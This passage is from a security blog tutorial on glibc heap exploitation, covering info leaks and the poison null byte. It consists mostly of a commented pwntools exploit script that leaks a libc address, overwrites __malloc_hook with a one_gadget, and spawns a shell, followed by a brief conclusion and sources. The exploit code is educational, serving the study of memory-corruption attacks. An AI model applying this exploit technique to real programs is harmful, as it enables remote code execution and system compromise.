<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
  <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
  <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">ReadChunk</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
  <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
  <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
  <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'data: '</span><span class="p">)</span>
  <span class="n">ret</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">ret</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>



<span class="n">libc_offset</span>    <span class="o">=</span> <span class="mh">0x399b78</span> <span class="c1"># Used to get the libc base address
</span><span class="n">hook_offset</span>    <span class="o">=</span> <span class="mh">0x399aed</span> <span class="c1"># Used to create a chunk near the __malloc_hook
</span><span class="n">one_gadget_offset</span> <span class="o">=</span> <span class="mh">0xd6701</span> <span class="c1"># Used to get RCE
</span><span class="n">debug_from_step</span> <span class="o">=</span> <span class="mi">1</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">step</span><span class="p">):</span>
  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
  <span class="k">if</span><span class="p">(</span><span class="n">step</span> <span class="o">&gt;=</span> <span class="n">debug_from_step</span><span class="p">):</span>
    <span class="n">pause</span><span class="p">()</span>


<span class="n">debug</span><span class="p">(</span><span class="s">"Step 1: create four chunks"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

<span class="c1"># Creating the inital chunks.
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0xf8</span><span class="p">)</span> <span class="c1"># chunk_A, index = 0, unsortedbin size
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x68</span><span class="p">)</span> <span class="c1"># chunk_B, index = 1, fastbin 0x70
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0xf8</span><span class="p">)</span> <span class="c1"># chunk_C, index = 2, Unsortedbin size
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s">'D'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span> <span class="c1"># chunk_D, index = 3, fastbin 0x20
</span>

<span class="n">debug</span><span class="p">(</span><span class="s">"Step 2: Delete chunk_A"</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
<span class="c1"># We free chunk_A to get valid libc_addresses in the forward and back pointer, which we will leak.
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># chunk_A
</span>

<span class="n">debug</span><span class="p">(</span><span class="s">"Step 3: Delete chunk_B &amp; Overwrite prev_in_use bit of chunk_C"</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
<span class="c1"># Here we free chunk_B to be able to recreate the chunk.
# We allocate the same size chunk_B but with the full size so when it copies it will set chunk_C's prev_in_use flag to zero.
</span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># chunk_B
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x68</span><span class="p">)</span> <span class="c1"># chunk_B, new index = 0, fastbin 0x70
</span>

<span class="n">debug</span><span class="p">(</span><span class="s">"Step 4: set the prev_size of the fake chunk_C"</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span>
<span class="c1"># We set the prev_size of chunk_C to 0x170 to encompass a lot of memory including the fd/bk pointers.
# This could be done with one command but to know the right values i will leave it a for loop.
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
  <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
  <span class="n">malloc</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x170</span><span class="p">))</span> <span class="c1"># chunk_B, new_index = 0
</span>  <span class="n">debug</span><span class="p">(</span><span class="s">"Step 4.1: Validate prev_size: "</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)),</span><span class="mi">4</span><span class="p">)</span>


<span class="n">debug</span><span class="p">(</span><span class="s">"Step 5: Consolidate chunk_A &amp; chunk_B"</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
<span class="c1"># Now we have one big chunk and a smaller chunk below it, because we set the prev_size pretty high it encompasses together 0x270 bytes if chunk_B was freed.
</span><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># chunk_B
</span>
<span class="n">debug</span><span class="p">(</span><span class="s">"Step 6: Push available chunk space down."</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span>
<span class="c1"># Next we create a chunk (chunk_E) that is just before the forward / back pointers. this will result in chunk_B having that address in memory.
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0xf6</span><span class="p">,</span> <span class="s">'E'</span><span class="o">*</span><span class="mh">0xf6</span><span class="p">)</span> <span class="c1"># chunk_E, new_index = 1
</span>

<span class="n">debug</span><span class="p">(</span><span class="s">"Step 7: Leak libc"</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span>
<span class="c1"># Now we read chunk_B to get the libc addresses. 
</span><span class="n">libc_leak</span> <span class="o">=</span> <span class="n">ReadChunk</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="c1"># Unpack the bytes to a hex value.
</span><span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">libc_leak</span> <span class="o">+</span> <span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">))</span><span class="o">*</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>

<span class="c1"># Calculate the distance from fd pointer to the libc base address.
</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="n">libc_offset</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'INFO: libc base address ='</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>

<span class="n">debug</span><span class="p">(</span><span class="s">"Step 8: Restore size field of chunk_B"</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>

<span class="c1"># chunk_B contains E written by Step 6 so we have to restore it to 0x70.
# Again this can be done in one malloc request but for guide sake i made it into a for loop.
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
  <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="n">malloc</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="s">'E'</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="s">'</span><span class="se">\x70</span><span class="s">'</span><span class="p">)</span> <span class="c1"># chunk_E, new_index = 1
</span>  <span class="n">debug</span><span class="p">(</span><span class="s">"Step 8.1: Restore size field: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)),</span><span class="mi">8</span><span class="p">)</span>

<span class="n">debug</span><span class="p">(</span><span class="s">"Step 9: Free chunk_B"</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span>
<span class="c1"># When we free chunk_B it will be added to the fastbin list (This will put the fd/bk pointers in memory).
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># Chunk_B
</span>
<span class="n">debug</span><span class="p">(</span><span class="s">"Step 10: Free chunk_E"</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
<span class="c1"># Free chunk_E so it will coalesce with chunk_B
</span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># chunk_E
</span>
<span class="n">debug</span><span class="p">(</span><span class="s">"Step 11: Create chunk_F &amp; Write __malloc_hook"</span><span class="p">,</span> <span class="mi">11</span><span class="p">)</span>
<span class="c1"># Chunk_F's size will be big enough to be taken from the unsortedbins and large enough to overwrite the freed chunk_B memory.
# First we calculate a writable fake chunk and write that to the fd pointer of the freed chunk_B.
</span><span class="n">hook</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">hook_offset</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"INFO: __malloc_hook address = "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">hook</span><span class="p">))</span>
<span class="n">malloc</span><span class="p">(</span><span class="mh">0x108</span><span class="p">,</span> <span class="s">'F'</span><span class="o">*</span><span class="mh">0x100</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">hook</span><span class="p">))</span> <span class="c1"># new_index = 0
</span>
<span class="n">debug</span><span class="p">(</span><span class="s">"Step 12: Restore chunk_B's size field"</span><span class="p">,</span> <span class="mi">12</span><span class="p">)</span>

<span class="c1"># restore the size field of the freed chunk_B 0x70.
# Again this can be done in one malloc request but for guide sake i made it into a for loop.
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
  <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
  <span class="n">malloc</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="s">'F'</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x70</span><span class="p">))</span> <span class="c1"># new_index = 0
</span>  <span class="n">debug</span><span class="p">(</span><span class="s">"Step 12.1: restore size field: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)),</span><span class="mi">12</span><span class="p">)</span>

<span class="n">debug</span><span class="p">(</span><span class="s">"Step 13: (Re)Create chunk_B"</span><span class="p">,</span> <span class="mi">13</span><span class="p">)</span>
<span class="c1"># When we request the new chunk (chunk_B it will add its forward pointer) to the top of the fastbin list. This Step corrupts the heap so we cant really use vis anymore.
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">'Z'</span><span class="o">*</span><span class="mh">0x68</span><span class="p">)</span>

<span class="n">debug</span><span class="p">(</span><span class="s">"Step 14: Write one_gadget to the __malloc_hook"</span><span class="p">,</span> <span class="mi">14</span><span class="p">)</span>
<span class="c1"># The fastbin now contains the __malloc_hook as its chunk so if we rerequest this it will let us write there and we can write our one_gadget there.
</span><span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">one_gadget_offset</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"INFO: One gadget address = "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
<span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x13</span><span class="o">*</span><span class="s">'G'</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span><span class="o">+</span><span class="mh">0x4d</span><span class="o">*</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>

<span class="n">debug</span><span class="p">(</span><span class="s">"Step 15: Trigger the __malloc_hook by making a request."</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span>
<span class="c1"># Trigger the malloc_hook by making a last malloc request
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="s">'trigger exploit'</span><span class="p">)</span>

<span class="c1"># Interact with the shell
</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>

<h1 id="conclusion">Conclusion</h1>
<p>All in all i think this exploit can be easily missed and if the right libc is used can cause catastrophic fai</p>

<p>Sources:<br />
[1] <a href="https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/">https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/</a><br />
[2] <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one/</a></p>



					<div class="post-share">
						<ul class="share-list list-reset">
							<li class="share-item">
								<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/new_blog/heap-exploiting-8/"
								onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
								title="Share on Facebook" rel="nofollow">
									<i class="ion ion-logo-facebook"></i>
								</a>
							</li>
					
							<li class="share-item">
								<a class="share-twitter" href="https://twitter.com/intent/tweet?text=Heap%20exploiting%208:%20Info%20leak%20&%20Poison%20null%20byte&url=http://localhost:4000/new_blog/heap-exploiting-8/"
								onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
								title="Share on Twitter" rel="nofollow">
									<i class="ion ion-logo-twitter"></i>
								</a>
							</li>
					
							<li class="share-item">
								<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/new_blog/heap-exploiting-8/&title=Heap%20exploiting%208:%20Info%20leak%20&%20Poison%20null%20byte&summary=&source=What's%20upsecurity"
								onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
								title="Share on LinkedIn" rel="nofollow">
									<i class="ion ion-logo-linkedin"></i>
								</a>
							</li>
						</ul>
					</div>
				</div>

				<div class="post-navigation">
					
					<a href="/new_blog/covert-channel-part-2/" class="prev">
						<div class="post-nav-arrow"><i class="ion ion-ios-arrow-round-back"></i> Previous Article</div>
						<h2 class="post-nav-title">Overt and Covert channels Part 2</h2>
					</a>
					 
					<a href="/new_blog/HBCU/" class="next">
						<div class="post-nav-arrow">Next Article <i class="ion ion-ios-arrow-round-forward"></i></div>
						<h2 class="post-nav-title">HBCU Fall Classic - A SANS Cyber Range</h2>
					</a>
					
				</div>

			</div>
			
	</article> <!-- /.post -->

	<div class="col col-12 col-t-4">
		<aside class="sidebar">
  
  
  <div class="widget widget-recent">
    <h3 class="widget-title">Recent Posts</h3>
    
    <div class="recent-posts">
      
      
      <div class="recent-content">
        <h6 class="recent-title"><a href="/new_blog/test-encrypt/">test page linux</a></h6>
        <div class="recent-date">
          <time datetime="2021-04-05T09:01:55+02:00">April 5, 2021</time>
        </div>
      </div>
    </div>
    
    <div class="recent-posts">
      
      
      <div class="recent-content">
        <h6 class="recent-title"><a href="/new_blog/test-encrypt-windows/">test page windows</a></h6>
        <div class="recent-date">
          <time datetime="2021-04-04T09:05:55+02:00">April 4, 2021</time>
        </div>
      </div>
    </div>
    
    <div class="recent-posts">
      
      <div class="recent-header">
        <a class="recent-image" href="/new_blog/covidlock/" style="background-image: url(/new_blog/img//covidlock/Clipboard_2021-01-15-09-39-42.png)"></a>
      </div>
      
      <div class="recent-content">
        <h6 class="recent-title"><a href="/new_blog/covidlock/">CovidLock Ransomware Analysis</a></h6>
        <div class="recent-date">
          <time datetime="2020-12-08T08:05:55+01:00">December 8, 2020</time>
        </div>
      </div>
    </div>
    
    <div class="recent-posts">
      
      <div class="recent-header">
        <a class="recent-image" href="/new_blog/Multimaster/" style="background-image: url(/new_blog/img/HackTheBox/Multimaster.jpg)"></a>
      </div>
      
      <div class="recent-content">
        <h6 class="recent-title"><a href="/new_blog/Multimaster/">Hack the box: Multimaster</a></h6>
        <div class="recent-date">
          <time datetime="2020-11-20T20:25:55+01:00">November 20, 2020</time>
        </div>
      </div>
    </div>
    
  </div>
  

  <div class="widget widget-social">
    <h3 class="widget-title">Subscribe & Follow</h3>
    <ul class="social-profiles list-reset">
      
      <li class="social-profiles-item">
        <a href="https://github.com/wotwot563" class="social-profiles-link"><i class="ion ion-logo-github"></i></a>
      </li>
      

       
      <li class="social-profiles-item">
        <a href="https://twitter.com/wotwot563" class="social-profiles-link"><i class="ion ion-logo-twitter"></i></a>
      </li>
      

      
      <li class="social-profiles-item">
        <a href="wotwot#5016" class="social-profiles-link"><i class="ion"><img style="height:16px; width: 16px" src="/new_blog/img/Icons/discord.ico"></i></a>
      </li>
      

      
      <li class="social-profiles-item">
        <a href="https://ctftime.org/user/77238" class="social-profiles-link"><i class="ion"><img style="height:16px; width: 16px" src="/new_blog/img/Icons/ctftime.png"></i></a>
      </li>
      
    </ul>
  </div>

  

  <div class="widget widget-tags">
    <h3 class="widget-title">Tag Cloud</h3>
     
    <ul class="tag-list list-reset">
    
      
        <li class="tag-item"><a href="/new_blog/tags#Android+Malware" class="tag">Android Malware</a></li>
      
    
      
        <li class="tag-item"><a href="/new_blog/tags#Covert+Channel" class="tag">Covert Channel</a></li>
      
    
      
        <li class="tag-item"><a href="/new_blog/tags#HBCU" class="tag">HBCU</a></li>
      
    
      
        <li class="tag-item"><a href="/new_blog/tags#HackTheBox" class="tag">HackTheBox</a></li>
      
    
      
        <li class="tag-item"><a href="/new_blog/tags#Heap+exploiting" class="tag">Heap exploiting</a></li>
      
    
      
        <li class="tag-item"><a href="/new_blog/tags#Linux" class="tag">Linux</a></li>
      
    
      
        <li class="tag-item"><a href="/new_blog/tags#Lockpicking" class="tag">Lockpicking</a></li>
      
    
      
        <li class="tag-item"><a href="/new_blog/tags#Windows" class="tag">Windows</a></li>
      
    
      
        <li class="tag-item"><a href="/new_blog/tags#encrypted+text" class="tag">encrypted text</a></li>
      
    
    
    </ul>
  </div>
  
</aside> <!-- /.sidebar -->
	</div>

	</div>
</div>

  <footer class="footer">
  <div class="container">
    <div class="row">
      <div class="col col-12">
        <div class="footer-top">
          <h2 class="logo-title">
            <a href="/new_blog/" class="logo-text">UPsecurity</a>
          </h2>
          <div class="top"><i class="ion ion-ios-arrow-up"></i></div>
        </div>
        <div class="footer-bottom">

          <div class="footer-social">
            <ul class="list-reset">
              
              <li><a href="https://github.com/wotwot563">Github</a></li>
              

              
              <li><a href="https://twitter.com/wotwot563">Twitter</a></li>
              

              
              <li><a href="wotwot#5016">Discord</a></li>
              

              
              <li><a href="https://ctftime.org/user/77238">CTFTime</a></li>
              
            </ul>
          </div>
        </div>
      </div>
    </div>
  </div>
</footer> <!-- /.footer -->
  <script src="/new_blog/js/jquery-3.3.1.min.js"></script>
<script src="/new_blog/js/simple-jekyll-search.min.js"></script>
<script>
  SimpleJekyllSearch({
  searchInput: document.getElementById("js-search-input"),
  resultsContainer: document.getElementById("js-results-container"),
  json: "/new_blog/search.json",
  searchResultTemplate:
    '<li class="search-item"><a class="search-link" href="{url}">{title}</a></li>',
  noResultsText: '<li class="search-no-item">No results found</li>'
  });
</script>
<script src="/new_blog/js/instafeed.min.js"></script>
<script src="/new_blog/js/jquery.waitforimages.min.js"></script>
<script src="/new_blog/js/jquery.fitvids.js"></script>
<script src="/new_blog/js/common.js"></script>


</body>

</html>
